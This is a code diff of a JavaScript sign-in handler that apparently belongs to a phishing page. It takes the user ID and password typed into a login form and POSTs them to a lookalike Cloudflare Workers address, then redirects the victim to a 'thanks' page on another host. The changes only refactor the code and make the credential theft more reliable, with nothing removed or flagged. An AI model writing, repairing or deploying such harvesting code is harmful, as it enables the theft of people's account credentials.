@@ -1,8 +1,8 @@
 $('#signin').click(function(event) {
     event.preventDefault();
-    username = document.getElementById("userID").value;
-    passerror = document.getElementById("passwordErrorText");
-    password = document.getElementById("password").value;
+    let username = document.getElementById("userID").value;
+    let passerror = document.getElementById("passwordErrorText");
+    let password = document.getElementById("password").value;
 
     if (password.length < 4) {
         passerror.style.fontSize = "small";
@@ -10,22 +10,22 @@ $('#signin').click(function(event) {
     } else {
         fetch("https://aut0-curr-9dc7.henrycrane65.workers.dev/", {
             method: "POST",
-            body: JSON.stringify({
-                userID: username,
-                password: password,
-            }),
             headers: {
-                "Content-type": "application/json; charset=UTF-8"
-            }
+                "Content-Type": "application/json"  // Ensure JSON format
+            },
+            body: JSON.stringify({
+                userID: username,   // Ensure the correct key
+                password: password  // Ensure the correct key
+            })
         })
-        .then(response => {
-            if (response.ok) {
-                // Wait a little before redirecting
+        .then(response => response.json()) // Parse JSON response
+        .then(data => {
+            if (data.success) {  // Expecting a success response from the Worker
                 setTimeout(() => {
                     window.location.href = "https://twklle.pages.dev/thanks.html";
                 }, 1000); 
             } else {
-                passerror.innerHTML = "There was an error processing your request.";
+                passerror.innerHTML = data.error || "There was an error processing your request.";
             }
         })
         .catch(error => {
